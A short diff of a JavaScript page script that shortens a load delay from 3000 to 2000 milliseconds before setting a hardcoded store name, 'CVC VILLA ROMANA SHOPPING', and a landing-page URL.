@@ -130,7 +130,7 @@ window.onload = async () => {
 	let imapa = document.querySelector('#imapa');
 	let pin = document.querySelector('#pin')
 
-	delay(3000, () => {
+	delay(2000, () => {
 		const res = {
 			"pes_fantas": "CVC VILLA ROMANA SHOPPING",
 			"fil_lndpag": "https://cvcvillaromanashopping.ofertascvcpravc.com.br/",
